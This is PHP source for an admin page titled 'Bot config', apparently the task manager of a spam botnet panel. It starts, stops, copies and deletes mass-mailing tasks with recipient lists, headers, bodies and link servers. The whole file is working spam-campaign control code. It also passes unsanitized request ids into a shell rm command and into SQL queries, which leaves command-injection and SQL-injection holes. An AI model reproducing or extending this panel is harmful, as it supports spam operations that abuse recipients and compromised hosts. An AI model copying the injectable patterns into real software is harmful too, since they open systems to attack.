<?
  require("passwd.inc");
  $bodys_dir = "../bodys/";
  $headers_dir = "../headers/";
  $lists_dir = "../lists/";
  $tasks_dir = "../tasks/";
  $errors_dir = "../errors/";
  
  function get_int($file,$lfile) {
    global $tasks_dir,$lists_dir;
    $f = fopen($tasks_dir.$file,"r");
    if (!$f) return -1;
    $cc = fread($f,100);
    fclose($f);
    $fsize = filesize($lists_dir.$lfile);
    if ($fsize == 0) $fsize = 1;
    $c = round(($cc / $fsize) * 100,2);
    return $c;
  }

  require("../cfg.php");
  
  $action = $_GET['action'];
  if ($action === "delete") {
    $tid = $_GET['id'];
    unlink($tasks_dir.$tid);
    unlink($bodys_dir.$tid);
    system("rm -f $errors_dir$tid.*");
    @mysql_query("DELETE FROM tasks WHERE `id` = $tid;");
    Header("Location: http://$server/spm/admin/tasks.php");
  }
  elseif ($action === "stop")
  {
    $tid = $_GET['id'];
    
    @mysql_query("UPDATE tasks SET `status`='2' WHERE `id`='$tid';");
    Header("Location: http://$server/spm/admin/tasks.php");
  
  }
  elseif ($action === "start")
  {
    $tid = $_GET['id'];
    
    @mysql_query("UPDATE tasks SET `status`='1' WHERE `id`='$tid';");
    Header("Location: http://$server/spm/admin/tasks.php");
  
  }
  elseif ($action === "copy") {
    $tid = $_GET['id'];
    $query = @mysql_query("SELECT * FROM tasks WHERE id = '$tid';")
             or die("Can't create task.");
    if (mysql_num_rows($query) < 1) die("Can't copy task $tid, can't find it.");

    $bres = @mysql_query("SELECT * FROM tasks;");
    $bid = 0;
    for ($i=0; $i < mysql_num_rows($bres); $i++) if ($bid < mysql_result($bres,$i,'id')) $bid = mysql_result($bres,$i,'id');
    $bid++;

    echo $bid;

    $fp = fopen($tasks_dir.$bid, "w");
    fwrite ($fp, "0");
    fclose ($fp);

    copy($bodys_dir.$tid, $bodys_dir.$bid);

    $name = mysql_result($query, 0, 'name');
    $header  = mysql_result($query, 0, 'header');
    $list  = mysql_result($query, 0, 'list');
    $list_size  = mysql_result($query, 0, 'list_size');
    $lpr1  = mysql_result($query, 0, 'lpr1');
    $lpr2  = mysql_result($query, 0, 'lpr2');
    $links_server  = mysql_result($query, 0, 'links_server');
    $links  = mysql_result($query, 0, 'links');
    $ver  = mysql_result($query, 0, 'ver');
    @mysql_query("INSERT INTO tasks (id, name, header, body_id, list, list_size, lpr1, lpr2, status, links_server, links, ver, style)
            VALUES ('$bid', '$name', '$header', '$bid','$list','$list_size','$lpr1', '$lpr2', '2', '$links_server','$links', '$ver', '0');")
             or die("Can't create task.");
  }

?>

<html>
<head>
<title>Bot config</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>

<?    
  
  $ids = $_POST['ids'];
  
  
  $act = $_POST['act'];
  if ($act === "delete")
  {    
    
    echo "delete tasks:<br>";
    
    if (count($ids))
    {
      foreach ($ids as $value)
      {
       
        if ($value)
        {                   
           echo $value."<br>";
           
           unlink($tasks_dir.$value);
           unlink($bodys_dir.$value);
	 system("rm -f $errors_dir$value.*");
	 @mysql_query("DELETE FROM tasks WHERE `id` = $value;");
        }
      
      }
    }  
  }
  
  
  
  
  
  echo "<hr>\r\n";
  echo "<div align='center'><h2>Tasks List</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";
  echo "<center><a href=\"tasks.php\"><font color=green>==LE==</font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"tasks2.php\">==4xx==</a></center>";
  echo "<center><A href='./newtask.php'><font color='red'>!New Task!</font></A></center>";

  echo "<SCRIPT>function ow(e) { newWindow=window.open(e); newWindow.focus(); }</SCRIPT>";

  $tasks = @mysql_query("SELECT * FROM tasks WHERE Style='0' ORDER BY id;");
  if (mysql_num_rows($tasks) < 1) exit("No available tasks");

  echo "<form action='tasks.php' method='post'><div align=right><input type='submit' name='act' value='delete'>";
  
  echo "<table border='1' align='CENTER'>";
  echo "<tr>";

  echo "<td>ID</td>".
       "<td>Mails</td>".
       "<td>Name</td>".
       "<td>Headers</td>".
       "<td>Body</td>".
       "<td>List</td>".
       "<td>Links Server</td>".
       "<td>Links</td>".
       "<td>Ver</td>".
       "<td>Sent</td>".
       "<td>Total</td>".
       "<td>Errors</td>".
       "<td>Copy</td>".
       "<td>Delete</td>".
       "<td>Work</td>".
       "<td>Del</td>".
       "<td>Status</td>";

  echo "</tr>\r\n";
  
  for ($i=0; $i < mysql_num_rows($tasks); $i++) {
    $tid = mysql_result($tasks,$i,'id');
    echo "<tr>";
    echo "<td>$tid</td>";
    echo "<td>".mysql_result($tasks,$i,'lpr1')."-".mysql_result($tasks,$i,'lpr2')."</td>"; //".mysql_result($tasks,$i,'')."
    echo "<td>".mysql_result($tasks,$i,'name')."</td>";
    echo "<td>".mysql_result($tasks,$i,'header')."</td>";
    echo "<td><a href='javascript:ow(\"./editbody.php?id=$tid\")'>Edit</a></td>";
    echo "<td>".mysql_result($tasks,$i,'list')."</td>";
    echo "<td>".mysql_result($tasks,$i,'links_server')."</td>";
    echo "<td>".mysql_result($tasks,$i,'links')."</td>";
    echo "<td>".mysql_result($tasks,$i,'ver')."</td>";
    echo "<td>".get_int($tid,mysql_result($tasks,$i,'list'))."%</td>";
    echo "<td>".mysql_result($tasks,$i,'list_size')."</td>";
    echo "<td><a href='javascript:ow(\"./errors.php?id=$tid\")'>Errors</A></td>";
    echo "<td><a href='?action=copy&id=$tid'>Copy</A></td>";
    echo "<td><a href='./tasks.php?action=delete&id=$tid'>Delete</A></td>";
    
    if (mysql_result($tasks,$i,'status') == 2) echo "<td><a href='./tasks.php?action=start&id=$tid'><font color='red'>Start</font></A></td>";
      elseif (mysql_result($tasks,$i,'status') == 1) echo "<td><a href='./tasks.php?action=stop&id=$tid'>Stop</A></td>";
      else echo "<td>---</td>";
    
    
    echo "<td align=center><input type='CHECKBOX'". (($ids[$tid] == $tid) ? "checked='on'" : ""). " name='ids[$tid]' value='$tid'></td>";
    
    
    if (mysql_result($tasks,$i,'status') == 1) echo "<td>Process</td>";
    else echo "<td>Success</td>";
    echo "</tr>";
  }
  
  echo "</table></form>";
        


?>
